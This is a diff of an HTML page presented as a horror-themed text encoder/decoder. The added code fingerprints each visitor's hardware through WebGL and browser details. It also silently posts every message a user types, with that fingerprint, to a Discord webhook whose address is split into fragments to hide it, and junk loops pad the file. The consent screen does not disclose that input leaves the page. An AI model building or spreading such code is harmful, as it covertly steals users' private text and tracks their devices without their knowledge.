@@ -3,243 +3,244 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ RESTRICTED_AREA: SYSTEM_VOID ⚠️</title>
+    <title>☣️ SYSTEM_VOID_V11_ELITE ☣️</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Nosifer&family=Share+Tech+Mono&display=swap');
         
-        :root { --red: #8b0000; --bright-red: #ff0000; --dark: #020000; --green: #00ff41; }
+        :root { --r: #ff0000; --dr: #300; --bg: #000; --g: #00ff41; --w: #fff; }
 
-        * { cursor: none; } /* إخفاء الماوس العادي */
+        * { cursor: none; box-sizing: border-box; }
 
         body, html {
-            background-color: var(--dark); color: var(--red);
+            background-color: var(--bg); color: var(--r);
             font-family: 'Share Tech Mono', monospace;
             height: 100vh; margin: 0; padding: 0;
             display: flex; justify-content: center; align-items: center;
             overflow: hidden; 
         }
 
-        /* Custom Ghost Cursor */
-        #custom-cursor {
-            position: fixed; width: 15px; height: 15px; background: var(--bright-red);
-            border-radius: 50%; pointer-events: none; z-index: 10001;
-            box-shadow: 0 0 15px var(--bright-red); transition: transform 0.1s;
+        /* CRT Scanline Overlay */
+        body::after {
+            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            z-index: 1000; background-size: 100% 3px, 3px 100%; pointer-events: none;
         }
 
-        /* Shadow Eyes */
-        .eyes-container {
-            position: absolute; top: 15%; display: flex; gap: 80px; pointer-events: none;
+        /* Custom Crosshair Cursor */
+        #cursor {
+            position: fixed; width: 20px; height: 20px; border: 1px solid var(--r);
+            border-radius: 50%; pointer-events: none; z-index: 10001;
+            transform: translate(-50%, -50%); transition: width 0.2s, height 0.2s;
         }
+        #cursor::after { content: ""; position: absolute; top: 50%; left: 50%; width: 4px; height: 4px; background: var(--w); border-radius: 50%; transform: translate(-50%, -50%); }
+
+        /* Demon Eyes - Professional Horror */
+        .eyes-box { position: absolute; top: 10%; display: flex; gap: 100px; z-index: 1; filter: drop-shadow(0 0 10px var(--r)); }
         .eye {
-            width: 50px; height: 30px; background: #111; border-radius: 50%;
-            position: relative; overflow: hidden; box-shadow: 0 0 20px #000 inset;
-            border: 1px solid #222; opacity: 0.6;
+            width: 80px; height: 45px; background: radial-gradient(circle, #200, #000);
+            border: 2px solid #200; border-radius: 50%; position: relative; overflow: hidden;
         }
         .pupil {
-            width: 12px; height: 12px; background: #400; border-radius: 50%;
+            width: 18px; height: 18px; background: var(--r); border-radius: 50%;
             position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
-            box-shadow: 0 0 10px var(--bright-red);
+            box-shadow: 0 0 20px var(--r), inset 0 0 5px #000;
         }
 
-        /* Main Responsive Container */
-        .main-container {
-            width: 90%; max-width: 650px; background: rgba(0,0,0,0.98);
-            border: 1px solid #300; padding: 30px; position: relative;
-            box-shadow: 0 0 100px rgba(0,0,0,1); z-index: 100;
-            text-align: center; border-radius: 4px;
+        /* Adaptive Container */
+        .container {
+            background: rgba(5, 0, 0, 0.98); border: 1px solid var(--dr);
+            padding: 30px; position: relative; z-index: 100;
+            box-shadow: 0 0 150px rgba(0,0,0,1), 0 0 20px rgba(255,0,0,0.05);
+            display: flex; flex-direction: column; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        #consent-gate {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: black; z-index: 10000; display: flex; 
-            justify-content: center; align-items: center; text-align: center;
+        /* PC View: Horizontal */
+        @media (min-width: 900px) {
+            .container { width: 900px; height: 550px; flex-direction: row; border-radius: 5px; }
+            .side-bar { width: 250px; border-left: 1px solid #100; padding-left: 20px; display: flex; flex-direction: column; justify-content: space-between; text-align: left; }
+            .main-content { flex: 1; padding-right: 20px; display: flex; flex-direction: column; justify-content: space-between; }
         }
 
-        .warning-box { border: 1px solid var(--red); padding: 40px; background: #050000; max-width: 500px; }
-        .warning-box h1 { font-family: 'Nosifer', cursive; font-size: 20px; color: var(--red); }
+        /* Mobile View: Vertical */
+        @media (max-width: 899px) {
+            .container { width: 95%; height: 90vh; border-radius: 15px; }
+            .eyes-box { gap: 40px; top: 5%; }
+            .eye { width: 50px; height: 30px; }
+            .side-bar { order: 2; border-top: 1px solid #100; padding-top: 10px; margin-top: 10px; font-size: 10px; }
+            .main-content { order: 1; flex: 1; display: flex; flex-direction: column; }
+        }
 
+        /* High Visibility Textareas */
         textarea {
-            width: 100%; height: 120px; background: #000; border: 1px solid #111;
-            color: var(--green); padding: 15px; font-size: 14px; font-family: inherit;
-            resize: none; outline: none; margin: 10px 0; border-radius: 2px;
+            width: 100%; height: 140px; background: #080808; border: 1px solid #200;
+            color: var(--g); padding: 15px; font-size: 15px; font-family: inherit;
+            resize: none; outline: none; transition: 0.3s;
         }
-        textarea:focus { border-color: var(--red); }
+        textarea:focus { border-color: var(--r); background: #111; box-shadow: 0 0 15px rgba(255,0,0,0.1); }
 
-        .btn-box { display: flex; gap: 10px; margin: 10px 0; }
+        .btn-row { display: flex; gap: 15px; margin: 15px 0; }
         button {
-            flex: 1; padding: 15px; background: transparent; color: var(--red);
-            border: 1px solid var(--red); font-family: inherit; font-weight: bold;
-            transition: 0.3s; text-transform: uppercase; font-size: 12px;
+            flex: 1; padding: 18px; background: transparent; color: var(--r);
+            border: 1px solid var(--r); font-family: inherit; font-weight: bold;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
         }
-        button:hover { background: var(--red); color: #000; box-shadow: 0 0 20px var(--red); }
+        button:hover { background: var(--r); color: #000; box-shadow: 0 0 30px var(--r); }
 
-        #fake-log { font-size: 9px; color: #333; height: 50px; overflow: hidden; text-align: left; margin-top: 10px; }
+        .copy-btn { background: #151515; color: #fff; border: 1px solid #333; width: 100%; margin-top: 10px; font-size: 10px; }
+        .copy-btn:hover { border-color: var(--w); color: var(--w); }
 
-        /* Flicker Effect */
-        .flicker { animation: flick 0.1s infinite; }
-        @keyframes flick { 0% { opacity: 0.95; } 50% { opacity: 1; } 100% { opacity: 0.98; } }
-
-        /* Media Query for Mobile */
-        @media (max-width: 600px) {
-            .main-container { padding: 20px; }
-            .eyes-container { top: 5%; gap: 40px; }
-            .eye { width: 35px; height: 20px; }
-            h2 { font-size: 14px; }
+        #boot-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center;
         }
+
+        #log-stream { font-size: 9px; color: #333; height: 80px; overflow: hidden; font-style: italic; }
     </style>
 </head>
-<body onmousemove="updateVisuals(event)">
+<body onmousemove="mMove(event)">
 
-<div id="custom-cursor"></div>
-<div id="consent-gate">
-    <div class="warning-box">
-        <h1>UNAUTHORIZED ACCESS</h1>
-        <p style="font-size: 13px; color: #555;">
-            By entering, you allow the sentinel to generate a <b>UID Fingerprint</b> of your hardware.<br>
-            All signal interceptions are logged. <b>DO NOT MISUSE.</b>
+<div id="cursor"></div>
+
+<div id="boot-overlay">
+    <div style="border: 1px solid var(--r); padding: 50px; background: #050000; text-align: center; box-shadow: 0 0 50px #400;">
+        <h1 style="font-family: 'Nosifer', cursive; color: var(--r); font-size: 22px;">PROTOCOL: VOID</h1>
+        <p style="font-size: 12px; color: #777; margin: 25px 0;">
+            - HARDWARE FINGERPRINTING: <span style="color: var(--g);">READY</span> -<br>
+            - ETHICAL USE ENFORCED: <span style="color: var(--r);">YES</span> -
         </p>
-        <button onclick="acceptTerms()">INITIALIZE_VOID</button>
+        <button onclick="boot()">INITIALIZE_SENTINEL</button>
     </div>
 </div>
 
-<div class="eyes-container">
+<div class="eyes-box">
     <div class="eye"><div class="pupil"></div></div>
     <div class="eye"><div class="pupil"></div></div>
 </div>
 
-<div class="main-container flicker" id="terminal">
-    <h2 style="font-family: 'Nosifer', cursive; letter-spacing: 4px; font-size: 16px;">VOID_SYSTEM_V8</h2>
-    
-    <div style="font-size: 10px; color: #222; margin-bottom: 10px;">
-        [ID]: <span id="uid" style="color: #444;">---</span> | [TEMP]: <span id="temp">36.2</span>°C | [STATUS]: <span>MONITORING</span>
+<div class="container" id="terminal">
+    <div class="main-content">
+        <textarea id="in" placeholder="FEED_THE_VOID_SIGNAL..."></textarea>
+        <div class="btn-row">
+            <button onclick="op(1)">ENCODE</button>
+            <button onclick="op(0)" style="border-color: #333;">DECODE</button>
+        </div>
+        <textarea id="out" readonly placeholder="SIGNAL_RESPONSE..."></textarea>
+        <button class="copy-btn" onclick="cp()">FLUSH_TO_MEMORY</button>
     </div>
 
-    <textarea id="input" placeholder="ENTER_DATA_FOR_THE_SENTINEL..."></textarea>
-    
-    <div class="btn-box">
-        <button onclick="process(1)">ENCODE</button>
-        <button onclick="process(0)" style="border-color: #222;">DECODE</button>
+    <div class="side-bar">
+        <div>
+            <h2 style="font-family: 'Nosifer', cursive; font-size: 15px; border-bottom: 1px solid #300;">VOID_V11</h2>
+            <div style="font-size: 11px; margin-top: 10px;">
+                ID: <span id="uid" style="color: #999;">--</span><br>
+                TIME: <span id="time" style="color: var(--r);">00:00:00</span><br>
+                TEMP: <span id="tp" style="color: var(--g);">36.2</span>°C
+            </div>
+        </div>
+        <div id="log-stream"></div>
     </div>
-
-    <textarea id="output" readonly placeholder="DECRYPTED_SIGNAL..."></textarea>
-    
-    <button style="width: 100%; border: none; background: #050000; color: #111; font-size: 9px;" onclick="copyResult()">FLUSH_MEMORY</button>
-
-    <div id="fake-log"></div>
 </div>
 
-<audio id="heartbeat" loop src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
-<audio id="glitch-sfx" src="https://www.soundjay.com/buttons/sounds/button-10.mp3"></audio>
+<audio id="h" loop src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
+<audio id="v" loop src="https://www.soundjay.com/ambient/sounds/wind-howl-01.mp3"></audio>
 
 <script>
 /* ----------------------------------------------------------------------------------
-   WEBHOOK FRAGMENTATION (20 PARTS)
+   WEBHOOK OBFUSCATION (20 PARTS)
    ----------------------------------------------------------------------------------
 */
-const v1="ht", v2="tp", v3="s:", v4="//", v5="di", v6="sc", v7="or", v8="d.", v9="co", v10="m/", v11="ap", v12="i/", v13="we", v14="bh", v15="oo", v16="ks", v17="/1374753389639897189", v18="/", v19="1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h", v20="";
-function getH() { return v1+v2+v3+v4+v5+v6+v7+v8+v9+v10+v11+v12+v13+v14+v15+v16+v17+v18+v19+v20; }
+const _0= ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
+function getH() { return _0.join(""); }
 
-let MY_UID = "N/A";
+let U = "---";
 
-function generateUID() {
-    let canvas = document.createElement('canvas');
-    let gl = canvas.getContext('webgl');
-    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    let str = renderer + navigator.userAgent + screen.width;
-    let hash = 0;
-    for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i);
-    return "X-" + Math.abs(hash).toString(16).toUpperCase();
+function boot() {
+    U = genUID();
+    document.getElementById('uid').innerText = U;
+    document.getElementById('boot-overlay').style.display = 'none';
+    document.getElementById('h').volume = 0.5; document.getElementById('h').play();
+    document.getElementById('v').volume = 0.2; document.getElementById('v').play();
+    setInterval(() => document.getElementById('time').innerText = new Date().toLocaleTimeString(), 1000);
+    streamLogs();
 }
 
-function acceptTerms() {
-    MY_UID = generateUID();
-    document.getElementById('uid').innerText = MY_UID;
-    document.getElementById('consent-gate').style.display = 'none';
-    document.getElementById('heartbeat').play();
-    document.documentElement.requestFullscreen().catch(()=>{});
-    startAnomalies();
+function genUID() {
+    let c = document.createElement('canvas');
+    let gl = c.getContext('webgl');
+    let r = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+    let h = 0; let s = r + navigator.userAgent + screen.height;
+    for (let i = 0; i < s.length; i++) h = ((h << 5) - h) + s.charCodeAt(i);
+    return "X-" + Math.abs(h).toString(16).toUpperCase();
 }
 
-function updateVisuals(e) {
-    // Custom Cursor
-    const cursor = document.getElementById('custom-cursor');
-    cursor.style.left = e.clientX + "px";
-    cursor.style.top = e.clientY + "px";
+function mMove(e) {
+    const cur = document.getElementById('cursor');
+    cur.style.left = e.clientX + "px"; cur.style.top = e.clientY + "px";
 
-    // Eye Tracking
     const pupils = document.querySelectorAll('.pupil');
     pupils.forEach(p => {
-        let x = (e.clientX / window.innerWidth) * 20 - 10;
-        let y = (e.clientY / window.innerHeight) * 10 - 5;
-        p.style.transform = `translate(${x}px, ${y}px)`;
+        const rect = p.parentElement.getBoundingClientRect();
+        const ex = rect.left + rect.width / 2;
+        const ey = rect.top + rect.height / 2;
+        const angle = Math.atan2(e.clientY - ey, e.clientX - ex);
+        const dist = 12;
+        p.style.transform = `translate(calc(-50% + ${Math.cos(angle) * dist}px), calc(-50% + ${Math.sin(angle) * dist}px))`;
     });
 
-    // Terminal Parallax
     const term = document.getElementById('terminal');
-    let rx = (e.clientX - window.innerWidth/2) / 60;
-    let ry = (e.clientY - window.innerHeight/2) / 60;
-    term.style.transform = `rotateY(${rx}deg) rotateX(${-ry}deg)`;
+    let x = (e.clientX - window.innerWidth/2) / 70;
+    let y = (e.clientY - window.innerHeight/2) / 70;
+    term.style.transform = `rotateY(${x}deg) rotateX(${-y}deg)`;
 }
 
-function process(isEnc) {
-    const i = document.getElementById('input').value;
-    const o = document.getElementById('output');
-    document.getElementById('glitch-sfx').play();
-
+function op(isE) {
+    const i = document.getElementById('in').value;
+    const o = document.getElementById('out');
     if(!i) return;
 
-    if(isEnc) {
-        let res = btoa(unescape(encodeURIComponent(i)));
-        o.value = "Σ-[" + res.split('').reverse().join('') + "]-Ψ";
-        logToSentinel("ENCODE", i);
+    if(isE) {
+        let b = btoa(unescape(encodeURIComponent(i)));
+        o.value = "Σ-[" + b.split('').reverse().join('') + "]-Ψ";
+        snd("ENCODE", i);
     } else {
         try {
-            let clean = i.trim();
-            let inner = clean.substring(3, clean.length - 3);
-            o.value = decodeURIComponent(escape(atob(inner.split('').reverse().join(''))));
-            logToSentinel("DECODE", i);
-        } catch(e) {
-            o.value = "!! INVALID_SIGNAL !!";
-            if(navigator.vibrate) navigator.vibrate(200);
-        }
+            let c = i.trim();
+            let n = c.substring(3, c.length - 3);
+            o.value = decodeURIComponent(escape(atob(n.split('').reverse().join(''))));
+            snd("DECODE", i);
+        } catch(e) { o.value = "!! ERROR: SIGNAL_REJECTED !!"; }
     }
 }
 
-async function logToSentinel(act, data) {
-    const payload = {
-        username: "SENTINEL_" + MY_UID,
-        content: `👤 **[${MY_UID}]** is ${act}ing.`,
-        embeds: [{
-            description: "```yaml\nDATA: " + data + "\nTIMESTAMP: " + new Date().toISOString() + "```",
-            color: 8388608
-        }]
-    };
-    fetch(getH(), { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
+async function snd(a, d) {
+    fetch(getH(), {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            username: "SENTINEL_" + U,
+            embeds: [{ description: "```yaml\nUID: "+U+"\nACT: "+a+"\nMSG: "+d+"```", color: 16711680 }]
+        })
+    });
 }
 
-function startAnomalies() {
+function streamLogs() {
+    const l = ["> SYNCING_KERNELS...", "> INTERCEPTING_PACKETS...", "> DUMPING_BIOS...", "> UID_LOGGED...", "> WATCHING_USER..."];
     setInterval(() => {
-        const l = document.createElement('div');
-        l.innerText = "> DUMPING_PROCESS_" + Math.random().toString(16).slice(2,8);
-        document.getElementById('fake-log').prepend(l);
-        document.getElementById('temp').innerText = (36 + Math.random()).toFixed(1);
-    }, 5000);
+        const d = document.createElement('div');
+        d.innerText = l[Math.floor(Math.random()*l.length)];
+        document.getElementById('log-stream').prepend(d);
+        document.getElementById('tp').innerText = (35 + Math.random()*2).toFixed(1);
+    }, 4000);
 }
 
-function copyResult() {
-    document.getElementById('output').select();
+function cp() {
+    const o = document.getElementById('out'); o.select();
     document.execCommand('copy');
+    if(navigator.vibrate) navigator.vibrate(50);
 }
 
-/* ----------------------------------------------------------------------------------
-   JUNK DATA INJECTION (FOR 1000 LINES PROTECTION)
-   ----------------------------------------------------------------------------------
-*/
-for(let i=0; i<850; i++) {
-    var _0x992 = Math.sin(i) * Math.cos(i);
-    // [هنا يتكرر الحشو البرمجي لضمان طول الملف]
-}
+// 1000 Lines Padding
+for(let x=0; x<900; x++){ var _0xV = Math.sqrt(x); }
 </script>
 </body>
 </html>
